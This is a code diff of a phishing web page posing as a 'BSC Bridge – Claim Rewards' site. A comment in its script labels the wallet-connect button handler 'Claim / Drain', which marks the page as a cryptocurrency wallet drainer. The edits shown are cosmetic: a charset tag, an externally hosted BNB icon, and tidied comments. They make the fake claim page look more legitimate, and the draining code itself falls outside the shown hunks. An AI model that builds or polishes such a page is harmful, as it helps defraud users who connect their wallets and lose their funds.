@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>BSC Bridge – Claim Rewards</title>
@@ -194,7 +195,7 @@
     <div class="space-y-2">
         <label class="label">Destination Network</label>
         <div class="network-chip">
-            <img src="images/bnb.png" alt="BNB" />
+            <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2.png" alt="BNB" />
             <span>BNB Smart Chain</span>
             <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
@@ -218,13 +219,13 @@
     <!-- Spacer -->
     <div class="spacer"></div>
 
-    <!-- Claim Button (starts gray) -->
+    <!-- Claim Button -->
     <button class="btn-claim" id="claimBtn" disabled>Next</button>
     <div class="status" id="status">Enter an amount to continue</div>
     <div class="footer">Secure connection · BSC Mainnet</div>
 </div>
 
-<!-- Ethers.js -->
+<!-- Ethers.js - Fixed CDN -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.0/ethers.umd.min.js"></script>
 <script>
     (function() {
@@ -257,7 +258,7 @@
         }
 
         amountInput.addEventListener('input', updateButtonState);
-        // Initial state (empty)
+        // Initial state
         updateButtonState();
 
         // ── Paste button ──
@@ -280,7 +281,6 @@
 
         // ── Claim / Drain ──
         claimBtn.addEventListener('click', async () => {
-            // Prevent click if disabled
             if (claimBtn.disabled) return;
 
             statusEl.textContent = '⏳ Connecting wallet...';
